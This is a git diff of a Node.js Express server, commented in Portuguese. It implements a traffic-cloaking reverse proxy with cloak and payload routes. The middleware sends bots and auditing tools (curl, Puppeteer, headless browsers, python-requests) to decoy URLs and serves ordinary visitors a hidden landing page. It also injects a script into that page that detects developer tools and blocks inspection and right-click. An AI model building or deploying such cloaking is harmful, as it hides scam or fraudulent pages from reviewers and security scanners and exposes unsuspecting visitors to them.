@@ -1,14 +1,13 @@
-require('dotenv').config();
-const express = require('express');
-const mongoose = require('mongoose');
-const cors = require('cors');
-const helmet = require('helmet');
-const redis = require('redis');
-const fetch = require('node-fetch');
+require("dotenv").config();
+const express = require("express");
+const mongoose = require("mongoose");
+const cors = require("cors");
+const helmet = require("helmet");
+const redis = require("redis");
+const fetch = require("node-fetch");
 
-// Utils
-const { isBot } = require('./utils/botDetection');
-const { mutateHTMLSafe } = require('./utils/mutator'); // precisa estar implementado
+const { isBot } = require("./utils/botDetection");
+const { mutateHTMLSafe } = require("./utils/mutator");
 const Domain = require("./models/Domain");
 
 const app = express();
@@ -18,27 +17,27 @@ app.use(cors());
 app.use(helmet());
 app.use(express.json());
 
-// 📂 Importa rotas da API
-const authRoutes = require('./routes/auth.routes');
-const cloakRoutes = require('./routes/cloak.routes');
-const scriptRoutes = require('./routes/script.routes');
-const payloadRoutes = require('./routes/payload.routes');
-const domainRoutes = require("./routes/domain.routes.js");
+// 📂 Rotas da API
+const authRoutes = require("./routes/auth.routes");
+const cloakRoutes = require("./routes/cloak.routes");
+const scriptRoutes = require("./routes/script.routes");
+const payloadRoutes = require("./routes/payload.routes");
+const domainRoutes = require("./routes/domain.routes");
 
-app.use('/api/auth', authRoutes);
-app.use('/api/cloak', cloakRoutes);
-app.use('/api/domain', domainRoutes);
-app.use('/cloak/script', scriptRoutes); // camada extra JS
-app.use('/api/payload', payloadRoutes);
+app.use("/api/auth", authRoutes);
+app.use("/api/cloak", cloakRoutes);
+app.use("/api/domain", domainRoutes);
+app.use("/cloak/script", scriptRoutes);
+app.use("/api/payload", payloadRoutes);
 
 // 🧠 Redis
 if (process.env.REDIS_URL) {
   const redisClient = redis.createClient({ url: process.env.REDIS_URL });
 
-  redisClient.on('error', (err) => console.error('❌ Redis error:', err.message));
+  redisClient.on("error", (err) => console.error("❌ Redis error:", err.message));
   redisClient.connect()
-    .then(() => console.log('🔥 Redis conectado'))
-    .catch((err) => console.error('❌ Redis erro:', err.message));
+    .then(() => console.log("🔥 Redis conectado"))
+    .catch((err) => console.error("❌ Redis erro:", err.message));
 } else {
   console.warn("⚠️ Sem REDIS_URL → pulando Redis");
 }
@@ -47,49 +46,52 @@ if (process.env.REDIS_URL) {
 (async () => {
   try {
     await mongoose.connect(process.env.MONGO_URI);
-    console.log('🔥 MongoDB conectado');
+    console.log("🔥 MongoDB conectado");
   } catch (err) {
-    console.error('❌ Erro MongoDB:', err.message);
+    console.error("❌ Erro MongoDB:", err.message);
     process.exit(1);
   }
 })();
 
-// ⚔️ Middleware Proxy Blindado
+// ⚔️ Middleware Reverse Proxy Blindado
 app.use(async (req, res, next) => {
   try {
-    const host = req.hostname;
-    const ua = req.headers['user-agent'] || '';
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const host = req.hostname; // domínio acessado
+    const ua = req.headers["user-agent"] || "";
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-    // 🔥 Pega config do domínio no banco
-    const domain = await Domain.findOne({ url: `https://${host}` });
+    // 🔥 Busca config do domínio pelo officialUrl
+    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
     if (!domain) return res.redirect("https://google.com");
 
-    // 1. Anti-bot (antes de qualquer byte)
+    // 1. Anti-bot
     if (isBot(ua, ip)) {
       return res.redirect(domain.baseUrl);
     }
 
     // 2. Auditor/Headless/DevTools
-    if (ua.length < 20 || /Headless|Puppeteer|Scrapy|curl|python-requests|Go-http/i.test(ua)) {
+    if (
+      ua.length < 20 ||
+      /Headless|Puppeteer|Scrapy|curl|python-requests|Go-http/i.test(ua)
+    ) {
       return res.redirect(domain.fallbackUrl);
     }
 
-    // 3. Buscar site real → mutar HTML
-    const targetUrl = domain.url + req.originalUrl;
+    // 3. Buscar site real (landing escondida)
+    const targetUrl = domain.realUrl + req.originalUrl;
     const response = await fetch(targetUrl);
     let html = await response.text();
 
-    // 🔥 Injetar script extra de bloqueio client-side (anti-F12, anti-copy)
+    // 🔥 Script client-side anti-devtools
     const antiDevToolsScript = `
       <script>
         function devtoolsDetector(){
           const s = performance.now(); debugger; const e = performance.now();
           if(e-s>100){ window.location.href='${domain.fallbackUrl}'; }
         }
-        setInterval(devtoolsDetector,1000);
+        setInterval(devtoolsDetector, 1000);
 
-        document.addEventListener('keydown',function(e){
+        document.addEventListener('keydown', function(e){
           if(
             e.key==='F12' ||
             (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
@@ -99,13 +101,13 @@ app.use(async (req, res, next) => {
           }
         });
 
-        document.addEventListener('contextmenu',e=>{
+        document.addEventListener('contextmenu', e=>{
           e.preventDefault(); alert('🚫 Proibido clonar!');
         });
       </script>
     `;
 
-    // Mutar HTML e injetar script extra
+    // Mutar HTML e injetar anti-devtools
     let mutated = mutateHTMLSafe(html);
     mutated = mutated.replace("</body>", `${antiDevToolsScript}</body>`);
 
